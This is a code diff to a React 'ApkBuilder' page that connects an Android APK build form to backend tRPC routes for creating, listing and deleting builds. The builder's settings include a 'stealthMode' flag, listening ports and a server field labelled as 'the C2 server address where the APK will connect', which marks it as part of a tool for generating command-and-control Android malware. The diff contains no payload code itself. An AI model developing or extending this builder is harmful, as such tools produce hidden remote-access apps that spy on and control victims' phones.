@@ -55,27 +55,26 @@ export default function ApkBuilder() {
   const [newPort, setNewPort] = useState("");
   const [copiedBuildId, setCopiedBuildId] = useState<string | null>(null);
 
-  // TODO: Implement APK builder routes in tRPC
-  const builds: any[] = [];
-  const isLoading = false;
+  const utils = trpc.useUtils();
+  const { data: builds = [], isLoading } = trpc.apk.listBuilds.useQuery({ limit: 50 });
 
-  const buildApk = {
-    mutateAsync: async () => {
-      toast.success("APK build started successfully!");
-      setConfig({
-        appName: "Android Manager",
-        packageName: "com.example.manager",
-        versionName: "1.0.0",
-        versionCode: 1,
-        stealthMode: false,
-        sslEnabled: true,
-        ports: [8080],
-        serverUrl: "",
-        iconUrl: "",
-      });
+  const buildApkMutation = trpc.apk.buildAPK.useMutation({
+    onSuccess: () => {
+      toast.success("Build started! Check 'Builds' tab for status.");
+      utils.apk.listBuilds.invalidate();
+      setActiveTab("builds");
     },
-    isPending: false,
-  } as any;
+    onError: (err) => {
+      toast.error(`Build failed: ${err.message}`);
+    },
+  });
+
+  const deleteBuildMutation = trpc.apk.deleteBuild.useMutation({
+    onSuccess: () => {
+      toast.success("Build deleted");
+      utils.apk.listBuilds.invalidate();
+    },
+  });
 
   const handleAddPort = () => {
     const port = parseInt(newPort);
@@ -106,11 +105,23 @@ export default function ApkBuilder() {
       toast.error("App Name and Package Name are required");
       return;
     }
+    if (!config.serverUrl) {
+      toast.error("Server URL/Host is required");
+      return;
+    }
     if (config.ports.length === 0) {
       toast.error("At least one port is required");
       return;
     }
-    await buildApk.mutateAsync(config);
+
+    try {
+      new URL(config.serverUrl);
+    } catch (e) {
+      toast.error("Invalid Server URL (must include http/https)");
+      return;
+    }
+
+    await buildApkMutation.mutateAsync(config);
   };
 
   const copyToClipboard = (text: string, buildId: string) => {
@@ -311,9 +322,9 @@ export default function ApkBuilder() {
                 <Button
                   onClick={handleBuildApk}
                   className="btn-neon-cyan w-full mt-6"
-                  disabled={buildApk.isPending}
+                  disabled={buildApkMutation.isPending}
                 >
-                  {buildApk.isPending ? (
+                  {buildApkMutation.isPending ? (
                     <>
                       <Zap className="w-4 h-4 mr-2 animate-spin" />
                       Building...
@@ -392,10 +403,10 @@ export default function ApkBuilder() {
                 <div className="space-y-4">
                   <div>
                     <label className="text-sm font-medium glow-cyan mb-2 block">
-                      Server URL
+                      Server Connection (Host/IP)
                     </label>
                     <Input
-                      placeholder="https://your-server.com"
+                      placeholder="https://your-server.render.com"
                       value={config.serverUrl}
                       onChange={(e) =>
                         setConfig({ ...config, serverUrl: e.target.value })
@@ -403,7 +414,7 @@ export default function ApkBuilder() {
                       className="input-neon"
                     />
                     <p className="text-xs text-muted-foreground mt-1">
-                      Command & control server address
+                      The C2 server address where the APK will connect.
                     </p>
                   </div>
 
@@ -528,6 +539,16 @@ export default function ApkBuilder() {
                         </p>
                       </div>
                       <div className="flex items-center gap-2">
+                      <div className="flex items-center gap-2">
+                        <Button
+                          size="sm"
+                          variant="ghost"
+                          className="text-destructive hover:bg-destructive/10"
+                          onClick={() => deleteBuildMutation.mutate({ buildId: build.buildId })}
+                          disabled={deleteBuildMutation.isPending}
+                        >
+                          <Trash2 className="w-4 h-4" />
+                        </Button>
                         {build.status === "ready" && (
                           <>
                             <Button
@@ -545,7 +566,7 @@ export default function ApkBuilder() {
                               ) : (
                                 <>
                                   <Copy className="w-4 h-4 mr-1" />
-                                  Copy URL
+                                  URL
                                 </>
                               )}
                             </Button>
@@ -556,11 +577,12 @@ export default function ApkBuilder() {
                             >
                               <a href={build.apkUrl || "#"} download>
                                 <Download className="w-4 h-4 mr-1" />
-                                Download
+                                Get APK
                               </a>
                             </Button>
                           </>
                         )}
+                      </div>
                       </div>
                     </div>
                   ))}
